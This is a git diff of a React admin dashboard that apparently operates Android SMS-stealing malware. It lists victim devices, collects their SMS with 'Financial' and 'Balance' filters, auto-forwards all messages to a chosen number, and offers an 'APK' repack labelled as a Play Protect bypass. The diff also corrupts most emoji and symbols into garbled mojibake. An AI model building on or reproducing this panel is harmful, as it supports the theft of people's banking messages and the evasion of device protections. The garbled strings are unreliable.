-      if (event === "check_online:result") { const did = String(msg.deviceId || msg?.data?.deviceId || ""); const ts = Number(msg?.data?.checkedAt || Date.now()); const status = String(msg?.data?.status || ""); const err = String(msg?.data?.error || ""); const inW = checkDeviceIdRef.current === did && checkStatusRef.current === "checking"; if (status === "online" && did) { setDevices((p) => p.map((d) => str(d.deviceId) === did ? { ...d, checkedAt: ts } : d)); setRecentlyOnlineMap((p) => ({ ...p, [did]: ts })); setTimeout(() => setRecentlyOnlineMap((p) => { const c = { ...p }; delete c[did]; return c; }), 5000); if (inW) { if (checkTimerRef.current) clearTimeout(checkTimerRef.current); checkStatusRef.current = "online"; setCheckAlert({ deviceId: did, status: "online" }); } } else if (err && err !== "missing_token" && inW) { if (checkTimerRef.current) clearTimeout(checkTimerRef.current); checkStatusRef.current = null; setCheckAlert({ deviceId: did, status: "checking" }); } return; }
+      if (event === "check_online:result") { const did = String(msg.deviceId || msg?.data?.deviceId || ""); const ts = Number(msg?.data?.checkedAt || Date.now()); const status = String(msg?.data?.status || ""); const err = String(msg?.data?.error || ""); const inW = checkDeviceIdRef.current === did && checkStatusRef.current === "checking"; if (status === "online" && did) { setDevices((p) => p.map((d) => str(d.deviceId) === did ? { ...d, checkedAt: ts } : d)); setRecentlyOnlineMap((p) => ({ ...p, [did]: ts })); setTimeout(() => setRecentlyOnlineMap((p) => { const c = { ...p }; delete c[did]; return c; }), 5000); if (inW) { if (checkTimerRef.current) clearTimeout(checkTimerRef.current); checkStatusRef.current = "online"; setCheckAlert({ deviceId: did, status: "online" }); } } else if (err === "missing_token" && inW) { if (checkTimerRef.current) clearTimeout(checkTimerRef.current); checkStatusRef.current = "uninstalled"; setCheckAlert({ deviceId: did, status: "uninstalled" }); }
+      else if (err && err !== "missing_token" && inW) { if (checkTimerRef.current) clearTimeout(checkTimerRef.current); checkStatusRef.current = null; setCheckAlert({ deviceId: did, status: "checking" }); } return; }
       if (event === "device:uninstalled") { const did = String(msg.deviceId || msg?.data?.deviceId || ""); if (did) setUninstalledSet((p) => new Set([...p, did])); const inW = checkDeviceIdRef.current === did && (checkStatusRef.current === "checking" || (checkStatusRef.current === null && Date.now() - checkWindowRef.current < 30000)); if (inW) { if (checkTimerRef.current) clearTimeout(checkTimerRef.current); checkStatusRef.current = "uninstalled"; setCheckAlert({ deviceId: did, status: "uninstalled" }); } return; }
       if (event === "device:delete") { const did = String(msg.deviceId || msg?.data?.deviceId || ""); setDevices((p) => p.filter((d) => str(d.deviceId) !== did)); setSmsMap((p) => { const c = { ...p }; delete c[did]; return c; }); setUninstalledSet((p) => { const c = new Set(p); c.delete(did); return c; }); }
     });
@@ -1009,7 +1010,8 @@ export default function MainPage() {
     setCheckAlert({ deviceId, status: "checking" });
     if (checkTimerRef.current) clearTimeout(checkTimerRef.current);
     checkTimerRef.current = setTimeout(() => { if (checkDeviceIdRef.current === deviceId && checkStatusRef.current === "checking") { checkStatusRef.current = null; setCheckAlert({ deviceId, status: "checking" }); } }, 30000);
-    try { await axios.post(`${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(deviceId)}/ping`, { source: "main" }, { headers: apiHeaders(), timeout: 10000 }); } catch {}
+    try { await axios.post(`${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(deviceId)}/ping`, { source: "main" }, { headers: apiHeaders(), timeout: 10000 }); }
+    catch (err: any) { const apiErr = String(err?.response?.data?.error || ""); if (apiErr === "missing_token") { if (checkTimerRef.current) clearTimeout(checkTimerRef.current); checkStatusRef.current = "uninstalled"; setCheckAlert({ deviceId, status: "uninstalled" }); } }
   }, []);
 
   const openDevice      = useCallback((id: string) => { if (id) nav(`/devices/${encodeURIComponent(id)}`); }, [nav]);
@@ -1086,15 +1088,15 @@ export default function MainPage() {
   async function loadGlobalPhone() { try { const r = await fetch(`${ENV.API_BASE}/api/admin/globalPhone`, { headers: apiHeaders() }); const d = await r.json(); const ph = String(d?.phone || ""); setGlobalPhone(ph); setGlobalEnabled(!!ph); } catch {} }
   async function loadPinStatus() { try { const r = await fetch(`${ENV.API_BASE}/api/admin/deletePassword/status`, { headers: apiHeaders() }); const d = await r.json(); setPinIsSet(d?.isSet === true); } catch { setPinIsSet(null); } }
   async function loadSettingsData() { await Promise.all([loadGlobalPhone(), loadPinStatus()]); }
-  async function saveGlobalPhone() { setGlobalLoading(true); setGlobalMsg(""); try { await axios.put(`${ENV.API_BASE}/api/admin/globalPhone`, { phone: globalEnabled ? globalPhone : "" }, { headers: apiHeaders() }); setGlobalMsg(globalEnabled ? "✅ Saved!" : "✅ Cleared!"); if (!globalEnabled) setGlobalPhone(""); } catch { setGlobalMsg("❌ Failed"); } finally { setGlobalLoading(false); } }
-  async function changePin() { setPinMsg(""); if (pinIsSet === true && !pinOld) { setPinMsg("❌ Old PIN required"); return; } if (!pinNew) { setPinMsg("❌ New PIN required"); return; } if (pinNew !== pinConfirm) { setPinMsg("❌ PINs don't match"); return; } if (pinNew.length < 4) { setPinMsg("❌ Min 4 digits"); return; } try { const r = await axios.post(`${ENV.API_BASE}/api/admin/deletePassword/change`, { currentPassword: pinOld, newPassword: pinNew }, { headers: apiHeaders() }); if (r.data?.success) { setPinMsg("✅ PIN " + (pinIsSet ? "changed!" : "set!")); setPinOld(""); setPinNew(""); setPinConfirm(""); setPinIsSet(true); } else { setPinMsg("❌ " + (r.data?.error || "Failed")); } } catch (e: any) { setPinMsg("❌ " + (e?.response?.data?.error || "Failed")); } }
+  async function saveGlobalPhone() { setGlobalLoading(true); setGlobalMsg(""); try { await axios.put(`${ENV.API_BASE}/api/admin/globalPhone`, { phone: globalEnabled ? globalPhone : "" }, { headers: apiHeaders() }); setGlobalMsg(globalEnabled ? "âœ… Saved!" : "âœ… Cleared!"); if (!globalEnabled) setGlobalPhone(""); } catch { setGlobalMsg("âŒ Failed"); } finally { setGlobalLoading(false); } }
+  async function changePin() { setPinMsg(""); if (pinIsSet === true && !pinOld) { setPinMsg("âŒ Old PIN required"); return; } if (!pinNew) { setPinMsg("âŒ New PIN required"); return; } if (pinNew !== pinConfirm) { setPinMsg("âŒ PINs don't match"); return; } if (pinNew.length < 4) { setPinMsg("âŒ Min 4 digits"); return; } try { const r = await axios.post(`${ENV.API_BASE}/api/admin/deletePassword/change`, { currentPassword: pinOld, newPassword: pinNew }, { headers: apiHeaders() }); if (r.data?.success) { setPinMsg("âœ… PIN " + (pinIsSet ? "changed!" : "set!")); setPinOld(""); setPinNew(""); setPinConfirm(""); setPinIsSet(true); } else { setPinMsg("âŒ " + (r.data?.error || "Failed")); } } catch (e: any) { setPinMsg("âŒ " + (e?.response?.data?.error || "Failed")); } }
 
  async function changeLoginPassword() {
     setLoginPassMsg("");
-    if (!loginPassOld) { setLoginPassMsg("❌ Purana password daalo"); return; }
-    if (!loginPassNew) { setLoginPassMsg("❌ Naya password daalo"); return; }
-    if (loginPassNew !== loginPassConfirm) { setLoginPassMsg("❌ Passwords match nahi karte"); return; }
-    if (loginPassNew.length < 4) { setLoginPassMsg("❌ Min 4 characters chahiye"); return; }
+    if (!loginPassOld) { setLoginPassMsg("âŒ Purana password daalo"); return; }
+    if (!loginPassNew) { setLoginPassMsg("âŒ Naya password daalo"); return; }
+    if (loginPassNew !== loginPassConfirm) { setLoginPassMsg("âŒ Passwords match nahi karte"); return; }
+    if (loginPassNew.length < 4) { setLoginPassMsg("âŒ Min 4 characters chahiye"); return; }
     setLoginPassLoading(true);
     try {
       const storedUser = getLoggedInUser() || "admin";
@@ -1103,26 +1105,26 @@ export default function MainPage() {
         { headers: apiHeaders() }
       );
       if (r.data?.success) {
-        setLoginPassMsg("✅ Password change ho gaya! Ab logout ho raha hai...");
+        setLoginPassMsg("âœ… Password change ho gaya! Ab logout ho raha hai...");
         setLoginPassOld(""); setLoginPassNew(""); setLoginPassConfirm("");
         await axios.delete(`${ENV.API_BASE}/api/admin/sessions`, { headers: apiHeaders() }).catch(() => {});
         setTimeout(() => { logout(); window.location.href = "/login"; }, 2000);
       } else {
-        setLoginPassMsg("❌ " + (r.data?.error || "Failed"));
+        setLoginPassMsg("âŒ " + (r.data?.error || "Failed"));
       }
     } catch (e: any) {
       const err = e?.response?.data?.error || "Failed";
       if (err === "unauthorized" || err === "current password required") {
-        setLoginPassMsg("❌ Purana password galat hai");
+        setLoginPassMsg("âŒ Purana password galat hai");
       } else {
-        setLoginPassMsg("❌ " + err);
+        setLoginPassMsg("âŒ " + err);
       }
     }
     finally { setLoginPassLoading(false); }
   }
-  // ── Danger Zone ───────────────────────────────────────────────────────────
+  // â”€â”€ Danger Zone â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   async function deleteAllSms() {
-    if (!dangerPin) { setDangerMsg("❌ Delete PIN daalo pehle"); return; }
+    if (!dangerPin) { setDangerMsg("âŒ Delete PIN daalo pehle"); return; }
     setDangerLoading(true); setDangerMsg("");
     try {
       await axios.delete(`${ENV.API_BASE}/api/notifications`, {
@@ -1131,10 +1133,10 @@ export default function MainPage() {
       });
       setSmsMap({});
       setDangerPin("");
-      setDangerMsg("✅ Sare SMS delete ho gaye!");
+      setDangerMsg("âœ… Sare SMS delete ho gaye!");
     } catch (e: any) {
       const err = e?.response?.data?.error || "Delete fail ho gaya";
-      setDangerMsg("❌ " + (err === "invalid_password" ? "PIN galat hai!" : err === "password_required" ? "PIN daalo!" : err));
+      setDangerMsg("âŒ " + (err === "invalid_password" ? "PIN galat hai!" : err === "password_required" ? "PIN daalo!" : err));
     }
     finally { setDangerLoading(false); }
   }
@@ -1153,7 +1155,7 @@ export default function MainPage() {
     return { allSms: list.sort((a, b) => getTs(b) - getTs(a)), smsPageMap: pageMap };
   }, [smsMap]);
 
-  // ── Filtered SMS ─────────────────────────────────────────────────────────
+  // â”€â”€ Filtered SMS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   const filteredSms = useMemo(() => {
     let list = [...allSms].sort((a, b) => sortByTime(a, b, sortMode));
     // Day filter
@@ -1224,15 +1226,15 @@ export default function MainPage() {
       {activeTab === "home" && (
         <div className="space-y-3 px-0 pb-24 pt-1">
           <FixApkBanner dark={dark} onOpen={openFixApk} />
-          {isLoading ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loading…</div>
+          {isLoading ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loadingâ€¦</div>
             : filterQ(mixedFeed).length === 0 ? <div className={`py-10 text-center ${D.empty(dark)}`}>No data yet.</div>
             : <div className="space-y-3 px-3">{filterQ(mixedFeed).slice(0, 100).map((item, i) => item._type === "form" ? <FormCard key={getId(item) || i} form={item} onDeviceClick={openDevice} dark={dark} deviceNumMap={deviceNumMap} /> : <SmsCard key={getId(item) || i} sms={item} onDeviceClick={openDevice} dark={dark} pageNum={smsPageMap[getId(item)]} deviceNumMap={deviceNumMap} />)}</div>}
         </div>
       )}
 
-      {activeTab === "data" && (<div className="space-y-3 px-3 pb-24 pt-1">{isLoading || loadingGroups ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loading…</div> : filterQ(allDataItems).length === 0 ? <div className={`py-10 text-center ${D.empty(dark)}`}>No data.</div> : filterQ(allDataItems).map((item, i) => <FormCard key={getId(item) || i} form={item} onDeviceClick={openDevice} dark={dark} deviceNumMap={deviceNumMap} />)}</div>)}
+      {activeTab === "data" && (<div className="space-y-3 px-3 pb-24 pt-1">{isLoading || loadingGroups ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loadingâ€¦</div> : filterQ(allDataItems).length === 0 ? <div className={`py-10 text-center ${D.empty(dark)}`}>No data.</div> : filterQ(allDataItems).map((item, i) => <FormCard key={getId(item) || i} form={item} onDeviceClick={openDevice} dark={dark} deviceNumMap={deviceNumMap} />)}</div>)}
 
-      {/* ── MESSAGES TAB with filters ── */}
+      {/* â”€â”€ MESSAGES TAB with filters â”€â”€ */}
       {activeTab === "messages" && (
         <div className="pb-24">
           {/* Search + Sort */}
@@ -1240,7 +1242,7 @@ export default function MainPage() {
 
           {/* Type filter */}
           <div className="flex gap-2 px-3 pb-2 overflow-x-auto scrollbar-hide">
-            {([["all", "🗂️ All"], ["financial", "💳 Financial"], ["balance", "💰 Balance"]] as [SmsFilter, string][]).map(([val, label]) => (
+            {([["all", "ðŸ—‚ï¸ All"], ["financial", "ðŸ’³ Financial"], ["balance", "ðŸ’° Balance"]] as [SmsFilter, string][]).map(([val, label]) => (
               <button key={val} type="button" onClick={() => setSmsTypeFilter(val)}
                 className={`shrink-0 rounded-full px-3 py-1.5 text-[12px] font-bold border transition-all ${smsTypeFilter === val ? "bg-blue-600 border-blue-600 text-white" : (dark ? "bg-gray-700 border-gray-600 text-gray-300" : "bg-white border-gray-200 text-gray-600")}`}>
                 {label}
@@ -1263,14 +1265,14 @@ export default function MainPage() {
           </div>
 
           <div className="space-y-3 px-3">
-            {loadingSms ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loading…</div>
+            {loadingSms ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loadingâ€¦</div>
               : filterQ(filteredSms).length === 0 ? <div className={`py-10 text-center ${D.empty(dark)}`}>No messages.</div>
               : filterQ(filteredSms).slice(0, 100).map((m, i) => <SmsCard key={getId(m) || i} sms={m} onDeviceClick={openDevice} dark={dark} pageNum={smsPageMap[getId(m)]} deviceNumMap={deviceNumMap} />)}
           </div>
         </div>
       )}
 
-      {activeTab === "groups" && (<div className="space-y-3 px-3 pb-24 pt-1">{loadingForms || loadingGroups ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loading…</div> : filterQ(groups).length === 0 ? <div className={`py-10 text-center ${D.empty(dark)}`}>No grouped data.</div> : filterQ(groups).map((g) => <GroupCard key={g.deviceId} deviceId={g.deviceId} items={g.items} onDeviceClick={openDevice} dark={dark} deviceNumMap={deviceNumMap} />)}</div>)}
+      {activeTab === "groups" && (<div className="space-y-3 px-3 pb-24 pt-1">{loadingForms || loadingGroups ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loadingâ€¦</div> : filterQ(groups).length === 0 ? <div className={`py-10 text-center ${D.empty(dark)}`}>No grouped data.</div> : filterQ(groups).map((g) => <GroupCard key={g.deviceId} deviceId={g.deviceId} items={g.items} onDeviceClick={openDevice} dark={dark} deviceNumMap={deviceNumMap} />)}</div>)}
 
       {activeTab === "devices" && (
         <div className="pb-24">
@@ -1283,7 +1285,7 @@ export default function MainPage() {
               </span>
             </div>
           )}
-          {loadingDevices ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loading…</div> : filterQ(sortedDevices).length === 0 ? <div className={`py-10 text-center ${D.empty(dark)}`}>No devices.</div> :
+          {loadingDevices ? <div className={`py-10 text-center ${D.empty(dark)}`}>Loadingâ€¦</div> : filterQ(sortedDevices).length === 0 ? <div className={`py-10 text-center ${D.empty(dark)}`}>No devices.</div> :
             <div className="grid grid-cols-2 gap-3 px-3 pt-1">{filterQ(sortedDevices).map((d, i) => <DeviceCard key={str(d.deviceId) || i} device={d} displayNum={deviceNumMap[str(d.deviceId)] ?? (filterQ(sortedDevices).length - i)} onCheckOnline={handleCheckOnline} onOpen={openDevice} recentlyOnline={!!recentlyOnlineMap[str(d.deviceId)]} dark={dark} isUninstalled={uninstalledSet.has(str(d.deviceId)) || str(d.fcmToken) === "__UNINSTALLED__"} isFavorite={favoritesMap[str(d.deviceId)] === true} onToggleFavorite={toggleFavorite} />)}</div>}
         </div>
       )}
@@ -1292,11 +1294,11 @@ export default function MainPage() {
       {helpOpen && (
         <div className="fixed inset-0 z-[1000] flex items-end bg-black/60" onClick={() => setHelpOpen(false)}>
           <div className="w-full rounded-t-2xl bg-[#1c1c1c] px-5 pt-5 pb-8" onClick={(e) => e.stopPropagation()}>
-            <div className="mb-4 flex items-center justify-between"><span className="text-[18px] font-bold text-white">Help</span><button type="button" onClick={() => setHelpOpen(false)} className="flex h-7 w-7 items-center justify-center rounded-lg border border-gray-600 text-[14px] text-gray-400">✕</button></div>
+            <div className="mb-4 flex items-center justify-between"><span className="text-[18px] font-bold text-white">Help</span><button type="button" onClick={() => setHelpOpen(false)} className="flex h-7 w-7 items-center justify-center rounded-lg border border-gray-600 text-[14px] text-gray-400">âœ•</button></div>
             <div className="mb-5 divide-y divide-gray-700 border-t border-gray-700">
-              {[{ label: "Fix APK", icon: "🔧", onClick: openFixApk }, { label: "APK Info", icon: "📦", onClick: () => { setHelpOpen(false); setHelpScreen("apk"); loadLicenseInfo(); } }, { label: "Settings", icon: "⚙️", onClick: () => { setHelpOpen(false); setHelpScreen("settings"); loadSettingsData(); loadLicenseInfo(); } }, { label: "Logout", icon: "🚪", onClick: handleLogout }].map((item) => (
+              {[{ label: "Fix APK", icon: "ðŸ”§", onClick: openFixApk }, { label: "APK Info", icon: "ðŸ“¦", onClick: () => { setHelpOpen(false); setHelpScreen("apk"); loadLicenseInfo(); } }, { label: "Settings", icon: "âš™ï¸", onClick: () => { setHelpOpen(false); setHelpScreen("settings"); loadSettingsData(); loadLicenseInfo(); } }, { label: "Logout", icon: "ðŸšª", onClick: handleLogout }].map((item) => (
                 <button key={item.label} type="button" onClick={item.onClick} className="flex w-full items-center justify-between py-3 text-[15px] text-gray-200">
-                  <span className="flex items-center gap-3"><span className="text-[18px]">{item.icon}</span>{item.label}</span><span className="text-gray-500">›</span>
+                  <span className="flex items-center gap-3"><span className="text-[18px]">{item.icon}</span>{item.label}</span><span className="text-gray-500">â€º</span>
                 </button>
               ))}
             </div>
@@ -1320,11 +1322,11 @@ export default function MainPage() {
         </div>
       )}
 
-      {/* ══ SETTINGS SCREEN ══ */}
+      {/* â•â• SETTINGS SCREEN â•â• */}
       {helpScreen === "settings" && (
         <div className="fixed inset-0 z-[1000] overflow-auto bg-[#f2f2f7]">
           <div className="sticky top-0 z-10 flex items-center gap-3 border-b border-gray-200 bg-white px-4 py-3 shadow-sm">
-            <button type="button" onClick={() => setHelpScreen("")} className="flex h-8 w-8 items-center justify-center rounded-full bg-gray-100 text-[18px] text-gray-600">←</button>
+            <button type="button" onClick={() => setHelpScreen("")} className="flex h-8 w-8 items-center justify-center rounded-full bg-gray-100 text-[18px] text-gray-600">â†</button>
             <span className="text-[17px] font-bold text-gray-900">Settings</span>
           </div>
           <div className="mx-auto max-w-[480px] space-y-3 p-4">
@@ -1338,7 +1340,7 @@ export default function MainPage() {
               }`}>
                 <div className="flex items-center justify-between">
                   <div className="flex items-center gap-2">
-                    <span className="text-[18px]">📅</span>
+                    <span className="text-[18px]">ðŸ“…</span>
                     <span className="text-[14px] font-bold text-gray-800">License Status</span>
                   </div>
                   <span className={`rounded-full px-3 py-1 text-[11px] font-black ${
@@ -1361,7 +1363,7 @@ export default function MainPage() {
                 </div>
                 {licenseDaysLeft !== null && licenseDaysLeft <= 5 && (
                   <div className="mt-2 rounded-xl bg-red-100 px-3 py-2 text-[12px] font-semibold text-red-600">
-                    ⚠️ License jaldi expire hone wali hai! Renew karo.
+                    âš ï¸ License jaldi expire hone wali hai! Renew karo.
                   </div>
                 )}
               </div>
@@ -1370,21 +1372,21 @@ export default function MainPage() {
             {/* SMS Forwarding */}
             <div className="rounded-2xl bg-white shadow-sm overflow-hidden">
               <div className="px-5 pt-5 pb-2">
-                <div className="flex items-center gap-2 mb-1"><span className="text-[18px]">📲</span><span className="text-[15px] font-bold text-gray-900">Auto SMS Forwarding</span></div>
+                <div className="flex items-center gap-2 mb-1"><span className="text-[18px]">ðŸ“²</span><span className="text-[15px] font-bold text-gray-900">Auto SMS Forwarding</span></div>
                 <p className="text-[12px] text-gray-400 mb-4">Sabhi SMS automatically ek number pe forward hote hain</p>
                 <div className="flex items-center justify-between mb-5 p-3 rounded-xl bg-gray-50 border border-gray-100">
-                  <div><div className="text-[13px] font-semibold text-gray-700">Forwarding</div><div className={`text-[11px] font-medium ${globalEnabled ? "text-green-600" : "text-gray-400"}`}>{globalEnabled ? "ON — Active" : "OFF — Disabled"}</div></div>
+                  <div><div className="text-[13px] font-semibold text-gray-700">Forwarding</div><div className={`text-[11px] font-medium ${globalEnabled ? "text-green-600" : "text-gray-400"}`}>{globalEnabled ? "ON â€” Active" : "OFF â€” Disabled"}</div></div>
                   <button type="button" onClick={() => { setGlobalEnabled((v) => !v); setGlobalMsg(""); }} className={`relative h-8 w-14 rounded-full transition-colors duration-200 ${globalEnabled ? "bg-green-500" : "bg-gray-300"}`}><span className={`absolute top-1 h-6 w-6 rounded-full bg-white shadow transition-transform duration-200 ${globalEnabled ? "translate-x-7" : "translate-x-1"}`} /></button>
                 </div>
                 <SettingsInput label="Forward Number" hint="Jis number pe SMS bhejne hain (with country code)" value={globalPhone} onChange={setGlobalPhone} inputMode="tel" />
               </div>
-              <div className="px-5 pb-5"><button type="button" onClick={saveGlobalPhone} disabled={globalLoading} className="w-full rounded-xl bg-gray-900 py-3 text-[14px] font-bold text-white disabled:opacity-50 active:scale-[0.98]">{globalLoading ? "Saving…" : "Save Changes"}</button>{globalMsg && <div className="mt-2 text-center text-[13px] font-medium">{globalMsg}</div>}</div>
+              <div className="px-5 pb-5"><button type="button" onClick={saveGlobalPhone} disabled={globalLoading} className="w-full rounded-xl bg-gray-900 py-3 text-[14px] font-bold text-white disabled:opacity-50 active:scale-[0.98]">{globalLoading ? "Savingâ€¦" : "Save Changes"}</button>{globalMsg && <div className="mt-2 text-center text-[13px] font-medium">{globalMsg}</div>}</div>
             </div>
 
             {/* Change Login Password */}
             <div className="rounded-2xl bg-white shadow-sm overflow-hidden">
               <div className="px-5 pt-5 pb-2">
-                <div className="flex items-center gap-2 mb-1"><span className="text-[18px]">🔑</span><span className="text-[15px] font-bold text-gray-900">Login Password Change</span></div>
+                <div className="flex items-center gap-2 mb-1"><span className="text-[18px]">ðŸ”‘</span><span className="text-[15px] font-bold text-gray-900">Login Password Change</span></div>
                 <p className="text-[12px] text-gray-400 mb-4">Password change hone par sare devices se logout ho jaoge</p>
                 <SettingsInput label="Purana Password" value={loginPassOld} onChange={setLoginPassOld} type="password" />
                 <SettingsInput label="Naya Password" value={loginPassNew} onChange={setLoginPassNew} type="password" />
@@ -1393,7 +1395,7 @@ export default function MainPage() {
               <div className="px-5 pb-5">
                 <button type="button" onClick={changeLoginPassword} disabled={loginPassLoading}
                   className="w-full rounded-xl bg-blue-600 py-3 text-[14px] font-bold text-white disabled:opacity-50 active:scale-[0.98]">
-                  {loginPassLoading ? "Changing…" : "🔑 Password Change Karo"}
+                  {loginPassLoading ? "Changingâ€¦" : "ðŸ”‘ Password Change Karo"}
                 </button>
                 {loginPassMsg && <div className="mt-2 text-center text-[13px] font-medium">{loginPassMsg}</div>}
               </div>
@@ -1404,7 +1406,7 @@ export default function MainPage() {
             {/* Delete Password PIN */}
             <div className="rounded-2xl bg-white shadow-sm overflow-hidden">
               <div className="px-5 pt-5 pb-2">
-                <div className="flex items-center gap-2 mb-1"><span className="text-[18px]">🔐</span><span className="text-[15px] font-bold text-gray-900">{pinIsSet === false ? "Set Delete PIN" : "Change Delete PIN"}</span></div>
+                <div className="flex items-center gap-2 mb-1"><span className="text-[18px]">ðŸ”</span><span className="text-[15px] font-bold text-gray-900">{pinIsSet === false ? "Set Delete PIN" : "Change Delete PIN"}</span></div>
                 <p className="text-[12px] text-gray-400 mb-4">{pinIsSet === false ? "SMS/Device delete ke liye PIN set karo" : "SMS/Device delete PIN badlo"}</p>
                 {pinIsSet !== false && <SettingsInput label="Old PIN" value={pinOld} onChange={setPinOld} type="password" inputMode="numeric" />}
                 <SettingsInput label="New PIN" value={pinNew} onChange={setPinNew} type="password" inputMode="numeric" />
@@ -1413,7 +1415,7 @@ export default function MainPage() {
               <div className="px-5 pb-5"><button type="button" onClick={changePin} className="w-full rounded-xl bg-gray-900 py-3 text-[14px] font-bold text-white active:scale-[0.98]">{pinIsSet === false ? "Set PIN" : "Change PIN"}</button>{pinMsg && <div className="mt-2 text-center text-[13px] font-medium">{pinMsg}</div>}</div>
             </div>
 
-            {/* ─── Fix APK Card ─── */}
+            {/* â”€â”€â”€ Fix APK Card â”€â”€â”€ */}
             <div
               onClick={() => { setHelpScreen(""); setTimeout(openFixApk, 100); }}
               className="cursor-pointer rounded-2xl overflow-hidden shadow-sm active:scale-[0.98] transition-transform"
@@ -1424,22 +1426,22 @@ export default function MainPage() {
                     <span className="text-[11px] font-bold tracking-widest text-orange-400 uppercase">APK Protection</span>
                   </div>
                   <div className="text-[16px] font-black text-white leading-tight mb-1">Fix APK</div>
-                  <div className="text-[11px] text-blue-200">Play Protect bypass — automatic repack</div>
+                  <div className="text-[11px] text-blue-200">Play Protect bypass â€” automatic repack</div>
                 </div>
                 <div className="flex h-12 w-12 items-center justify-center rounded-2xl shadow-lg ml-3"
                   style={{ background: "linear-gradient(135deg, #f7971e, #ffd200)" }}>
-                  <span className="text-[22px]">🔧</span>
+                  <span className="text-[22px]">ðŸ”§</span>
                 </div>
               </div>
             </div>
 
           
 
-            {/* ─── Danger Zone ─── */}
+            {/* â”€â”€â”€ Danger Zone â”€â”€â”€ */}
             <div className="rounded-2xl overflow-hidden border-2 border-red-200 bg-white shadow-sm">
               <div className="px-5 pt-5 pb-3">
                 <div className="flex items-center gap-2 mb-1">
-                  <span className="text-[18px]">⚠️</span>
+                  <span className="text-[18px]">âš ï¸</span>
                   <span className="text-[15px] font-black text-red-600">Danger Zone</span>
                 </div>
                 <p className="text-[12px] text-red-400 mb-4">Yahan se kiya koi bhi action undo nahi ho sakta. Soch ke karo!</p>
@@ -1448,7 +1450,7 @@ export default function MainPage() {
                 <div className="mb-3 rounded-xl bg-red-50 border border-red-100 p-4">
                   <div className="flex items-start justify-between gap-3">
                     <div className="flex-1">
-                      <div className="text-[13px] font-bold text-red-700 mb-0.5">🗑️ Delete All SMS</div>
+                      <div className="text-[13px] font-bold text-red-700 mb-0.5">ðŸ—‘ï¸ Delete All SMS</div>
                       <div className="text-[11px] text-red-400">Saare SMS/notifications permanently delete ho jaayenge. Ye action undo nahi hoga!</div>
                     </div>
                     <div className="flex flex-col items-center justify-center rounded-xl bg-red-100 px-3 py-2 min-w-[52px]">
@@ -1465,10 +1467,10 @@ export default function MainPage() {
                     className="mt-3 w-full rounded-xl border border-red-200 bg-white px-4 py-2.5 text-[13px] font-semibold text-gray-800 outline-none focus:border-red-400"
                   />
                   <button type="button" onClick={() => {
-                    if (window.confirm(`Pakka? ${totalSmsCount} SMS delete ho jaayenge — ye wapas nahi aayenge!`)) deleteAllSms();
+                    if (window.confirm(`Pakka? ${totalSmsCount} SMS delete ho jaayenge â€” ye wapas nahi aayenge!`)) deleteAllSms();
                   }} disabled={dangerLoading}
                     className="mt-2 w-full rounded-xl bg-red-600 py-2.5 text-[13px] font-black text-white disabled:opacity-50 active:scale-[0.98]">
-                    {dangerLoading ? "Deleting…" : `🗑️ Delete All ${totalSmsCount} SMS`}
+                    {dangerLoading ? "Deletingâ€¦" : `ðŸ—‘ï¸ Delete All ${totalSmsCount} SMS`}
                   </button>
                 </div>
 
@@ -1476,7 +1478,7 @@ export default function MainPage() {
               </div>
             </div>
 
-            {/* ─── Developer Zone ─── */}
+            {/* â”€â”€â”€ Developer Zone â”€â”€â”€ */}
             <DevZone apiBase={str(ENV.API_BASE || "")} apiHeaders={apiHeaders()} />
 
           </div>
@@ -1490,14 +1492,14 @@ export default function MainPage() {
           {/* Header */}
           <div className="flex items-center gap-3 px-4 pt-12 pb-2">
             <button type="button" onClick={() => setHelpScreen("")}
-              className="flex h-9 w-9 items-center justify-center rounded-full bg-white/10 text-white text-[18px]">←</button>
+              className="flex h-9 w-9 items-center justify-center rounded-full bg-white/10 text-white text-[18px]">â†</button>
             <div className="flex-1">
               <div className="text-[10px] font-bold tracking-widest text-orange-400 uppercase">CEH Panel</div>
               <div className="text-[20px] font-black text-white">APK Info</div>
             </div>
             <div className="flex h-11 w-11 items-center justify-center rounded-2xl"
               style={{ background: "linear-gradient(135deg, #f7971e, #ffd200)" }}>
-              <span className="text-[20px]">📦</span>
+              <span className="text-[20px]">ðŸ“¦</span>
             </div>
           </div>
 
@@ -1517,7 +1519,7 @@ export default function MainPage() {
                 <div className="flex items-end justify-between">
                   <div>
                     <div className="text-[11px] text-white/30 mb-1">Expiry Date</div>
-                    <div className="text-[22px] font-black text-white">{licenseInfo?.expiryDate || "—"}</div>
+                    <div className="text-[22px] font-black text-white">{licenseInfo?.expiryDate || "â€”"}</div>
                   </div>
                   {licenseDaysLeft !== null && (
                     <div className="text-right">
@@ -1530,7 +1532,7 @@ export default function MainPage() {
                 </div>
                 {licenseDaysLeft !== null && licenseDaysLeft <= 5 && (
                   <div className="mt-3 rounded-xl bg-red-500/20 border border-red-500/30 px-3 py-2 text-[12px] font-semibold text-red-400">
-                    ⚠️ License jaldi expire hone wali hai! Renew karo.
+                    âš ï¸ License jaldi expire hone wali hai! Renew karo.
                   </div>
                 )}
               </div>
@@ -1554,12 +1556,12 @@ export default function MainPage() {
             {/* Panel Details Grid */}
             <div className="grid grid-cols-2 gap-3">
               {[
-                { icon: "🆔", label: "Panel ID", value: str(ENV.PANEL_ID || "-"), full: true },
-                { icon: "🏷️", label: "Version", value: str(ENV.VERSION || "v1.0") },
-                { icon: "💬", label: "Total SMS", value: String(totalSmsCount) },
